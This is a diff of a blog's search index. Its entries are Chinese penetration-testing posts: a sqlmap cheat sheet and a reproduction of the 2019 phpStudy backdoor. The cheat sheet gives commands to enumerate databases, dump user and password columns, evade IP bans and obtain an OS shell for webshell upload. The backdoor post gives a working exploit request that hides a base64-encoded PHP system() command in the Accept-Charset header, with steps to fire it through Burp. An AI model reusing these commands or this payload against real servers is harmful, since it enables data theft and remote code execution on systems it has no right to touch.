@@ -1,6 +1,22 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[sqlmap常用命令]]></title>
+    <url>%2F2019%2F11%2F11%2Fsqlmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
+    <content type="text"><![CDATA[sqlmap常用命令sqlmap作为我们渗透测试中的常用工具，必须要熟练掌握. 但是sqlmap本身的命令太多了，难以记忆。所以我在此记录了sqlmap的常用命令。发送请求sqlmap.py -u&quot;&quot; --cookie=&quot;&quot; 此语句用于后台注入，带上cookie，才能访问到该页面 sqlmap.py -u&quot;&quot; --random-agent 此语句从sqlmap\data\txt目录下的user-agents.txt中随机抽选一个请求头。（因为现在很多网址屏蔽了不带请求头的HTTP请求） sqlmap.py -u&quot;&quot; --delay=6 此语句是设置HTTP请求访问延迟，6为延迟6秒。（现在很多网址对于一个IP多次请求就会直接封IP，所以最好带上） sqlmap.py -u&quot;&quot; --level=3 sqlmap中一共有5个等级的测试 sqlmap.py -u&quot;&quot; --batch 自动帮你选择 y/n 列数据sqlmap.py -u&quot;&quot; --current-db 返回当前正在使用的数据库 sqlmap.py -u&quot;&quot; --current-user 可以获得当前数据库的管理用户 sqlmap.py -u&quot;&quot; --is-dba 检测当前用户是否为管理 sqlmap.py -u&quot;&quot; --users 列出所有管理用户 sqlmap.py -u&quot;&quot; --dbs 列出当前所有数据库 sqlmap.py --table -D dvwa 列出 dvwa库中的所有表 sqlmap.py --columns -T users -D dvwa 列出 users表中的所有字段 sqlmap.py --dump -C users,password -T users -D dvwa 列出两个字段的类容,此时你可以用sqlmap来跑这些密码，sqlmap里面有自动脚本，帮你跑出hash值. sqlmap.py --os-shell 用于模拟cmd命令，当你使用此命令是，sqlmap会写入两个PHP上去。你可以上传自己的webshell上去。]]></content>
+      <categories>
+        <category>安全工具</category>
+      </categories>
+      <tags>
+        <tag>zhuiri</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[代码审计]]></title>
+    <url>%2F2019%2F10%2F28%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
     <title><![CDATA[phpstudy后门利用]]></title>
     <url>%2F2019%2F09%2F29%2Fphpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%2F</url>
     <content type="text"><![CDATA[之前爆出的phpstudy后门，今天来复现一下 通过爆出来的信息得知，后门隐藏再PHP文件夹里，版本分别是php-5.217，php-5.4.45。后门代码存在\ext\php_xmlrpc.dll里 我们可以打开文件搜索关键字@eval 发现确实存在后门 那么上EXP 1234567891011GET /1.php HTTP/1.1Host: secquan.orgCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9Accept-Encoding:gzip,deflateAccept-Charset:这里就是要执行的命令base64加密c3lzdGVtKCdjYWxjLmV4ZScpOw==Cookie: UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282Connection: close Accept-Charset就是exp的核心，我们在这里面插入命令，通过base64编码，将包发送给服务器 开始实验- 首先我们打开phpstudy，将版本切换为php-5.4.45 + Apache 接下来打开burp来抓包 然后向数据内插入EXP 再burp中有编码转换的模块，打开然后开始转换 转换完成后，将其插入语句中 可以看到，代码成功执行了 注释:如果你执行失败，就修改一下包内的数据：Accept-Encoding:gzip,deflate 之间不要留空格。再你插入完成的语句的后门按两下回车。类似这样 本文到此结束]]></content>
